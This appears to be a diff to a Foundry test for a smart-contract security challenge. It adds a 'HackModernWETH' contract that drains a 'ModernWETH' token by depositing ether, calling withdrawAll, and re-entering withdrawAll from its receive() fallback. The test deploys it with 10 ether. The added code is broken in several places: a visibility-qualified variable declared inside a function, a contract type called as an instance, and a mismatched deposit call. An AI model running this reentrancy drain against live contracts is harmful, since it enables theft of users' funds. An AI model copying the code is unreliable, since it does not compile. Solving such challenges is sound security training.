@@ -8,7 +8,26 @@ import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
+contract HackModernWETH {
 
+    function attack() external payable {
+        //ModernWETH.deposit{value: msg.value}();
+        address public victim = address(ModernWETH);
+        ModernWETH.deposit(msg.value);
+        ModernWETH.withdrawAll();
+    }
+
+    receive() external payable {
+        if (address(ModernWETH).balance > 0) {
+            ModernWETH.withdrawAll();
+        }
+    }
+
+    //function deposit() external payable {
+    //    modernWETH.deposit{value: msg.value}();
+    //    modernWETH.withdrawAll();
+    //}
+}
 
 
 /*////////////////////////////////////////////////////////////
@@ -40,7 +59,10 @@ contract Challenge2Test is Test {
         // forge test --match-contract Challenge2Test -vvvv //
         ////////////////////////////////////////////////////*/
 
-
+        // the contract is vulnerable to cross-function reentrancy
+        HackModernWETH hack = new HackModernWETH();
+        // call attack with a value of 10 ether
+        hack.attack{value: 10 ether}();
 
         //==================================================//
         vm.stopPrank();
